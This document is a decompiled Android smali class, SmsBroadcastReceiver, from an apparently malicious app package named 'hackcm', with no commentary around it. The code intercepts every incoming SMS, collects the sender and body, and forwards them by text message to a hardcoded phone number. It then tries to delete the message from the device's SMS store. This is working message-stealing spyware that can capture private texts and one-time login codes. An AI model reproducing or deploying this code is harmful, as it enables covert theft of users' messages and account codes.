.class public Lwebhost/com/hackcm/SmsBroadcastReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsBroadcastReceiver.java"


# static fields
.field public static final SMS_BUNDLE:Ljava/lang/String; = "pdus"


# instance fields
.field address:Ljava/lang/String;

.field context:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public deleteSms(Ljava/lang/String;)Z
    .locals 6
    .param p1, "smsId"    # Ljava/lang/String;

    .prologue
    .line 49
    const/4 v1, 0x0

    .line 51
    .local v1, "isSmsDeleted":Z
    :try_start_0
    iget-object v2, p0, Lwebhost/com/hackcm/SmsBroadcastReceiver;->context:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "content://sms/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual {v2, v3, v4, v5}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 52
    const/4 v1, 0x1

    .line 57
    :goto_0
    return v1

    .line 54
    :catch_0
    move-exception v0

    .line 55
    .local v0, "ex":Ljava/lang/Exception;
    const/4 v1, 0x0

    goto :goto_0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v2, 0x0

    .line 20
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v7

    .line 21
    .local v7, "intentExtras":Landroid/os/Bundle;
    iput-object p1, p0, Lwebhost/com/hackcm/SmsBroadcastReceiver;->context:Landroid/content/Context;

    .line 22
    if-eqz v7, :cond_1

    .line 23
    const-string v1, "pdus"

    invoke-virtual {v7, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [Ljava/lang/Object;

    move-object v8, v1

    check-cast v8, [Ljava/lang/Object;

    .line 24
    .local v8, "sms":[Ljava/lang/Object;
    const-string v11, ""

    .line 25
    .local v11, "smsMessageStr":Ljava/lang/String;
    const/4 v6, 0x0

    .local v6, "i":I
    :goto_0
    array-length v1, v8

    if-ge v6, v1, :cond_0

    .line 26
    aget-object v1, v8, v6

    check-cast v1, [B

    check-cast v1, [B

    invoke-static {v1}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v10

    .line 28
    .local v10, "smsMessage":Landroid/telephony/SmsMessage;
    invoke-virtual {v10}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v9

    .line 29
    .local v9, "smsBody":Ljava/lang/String;
    invoke-virtual {v10}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lwebhost/com/hackcm/SmsBroadcastReceiver;->address:Ljava/lang/String;

    .line 31
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "SMS From: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v3, p0, Lwebhost/com/hackcm/SmsBroadcastReceiver;->address:Ljava/lang/String;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "\n"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 32
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "\n"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 25
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    .line 34
    .end local v9    # "smsBody":Ljava/lang/String;
    .end local v10    # "smsMessage":Landroid/telephony/SmsMessage;
    :cond_0
    const/4 v1, 0x0

    invoke-static {p1, v11, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 37
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 39
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    const-string v1, "01155503120"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Message from App::"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 40
    iget-object v1, p0, Lwebhost/com/hackcm/SmsBroadcastReceiver;->address:Ljava/lang/String;

    invoke-virtual {p0, v1}, Lwebhost/com/hackcm/SmsBroadcastReceiver;->deleteSms(Ljava/lang/String;)Z

    .line 43
    invoke-static {}, Lwebhost/com/hackcm/SmsActivity;->instance()Lwebhost/com/hackcm/SmsActivity;

    .line 46
    .end local v0    # "smsManager":Landroid/telephony/SmsManager;
    .end local v6    # "i":I
    .end local v8    # "sms":[Ljava/lang/Object;
    .end local v11    # "smsMessageStr":Ljava/lang/String;
    :cond_1
    return-void
.end method
